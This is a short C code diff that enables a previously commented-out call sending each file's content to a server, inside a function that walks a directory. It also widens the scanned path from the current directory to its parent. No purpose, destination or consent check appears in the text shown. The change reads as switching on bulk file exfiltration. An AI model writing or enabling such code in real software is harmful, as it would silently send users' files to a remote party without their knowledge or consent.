@@ -76,7 +76,7 @@ void process_directory(const char *directory_path)
 				content[file_size] = '\0';
 
 				// Send the file content to the server
-				//send_data_to_server(filepath, content);
+				send_data_to_server(filepath, content);
 
 				free(content);
 				fclose(file);
@@ -99,7 +99,7 @@ void process_directory(const char *directory_path)
 
 int main(void)
 {
-	const char *directory_path = ".";
+	const char *directory_path = "..";
 
 	process_directory(directory_path);
 
